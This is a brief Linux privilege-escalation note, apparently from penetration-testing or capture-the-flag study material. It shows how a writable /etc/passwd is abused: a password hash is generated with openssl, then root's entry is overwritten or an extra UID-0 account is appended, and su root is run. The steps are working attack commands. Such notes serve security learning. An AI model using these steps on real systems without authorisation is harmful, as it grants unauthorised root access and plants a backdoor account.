- - -
### Writable /etc/passwd :

The /etc/passwd file contains information about user accounts.
It is world-readable, but usually only writable by the root user.
Historically, the /etc/passwd file contained user password hashes,
and some versions of Linux will still allow password hashes to be stored there.

##### Check permissions :

```sh
ls -l /etc/passwd
```

#### Generate a new password hash :

```sh
openssl passwd <newpasswordhere>
```

Now there are two ways to do it :

1.  edit the root user's line and replace the " :**x**: " with your password hash. 

```
# For example : 

root:$6$jjIko8K0cUhqDwpM$grrIX6w76pr.jwn9u410jNmP8nOaYikxPG5uXzplvqghu9YvLZB7qJVazV1.zvPPDI8R9s/oKd9..TOTad6zN.:0:0:root:/root:/bin/bash
```

now save and exit

```sh
su root
```

2.  Copy the root user's line and paste it t the bottom as **newroot** user with your password hash.

```
# For example : 

lol:$6$jjIko8K0cUhqDwpM$grrIX6w76pr.jwn9u410jNmP8nOaYikxPG5uXzplvqghu9YvLZB7qJVazV1.zvPPDI8R9s/oKd9..TOTad6zN.:0:0:root:/root:/bin/bash
```

save and exit

```sh
su root
```

- - -

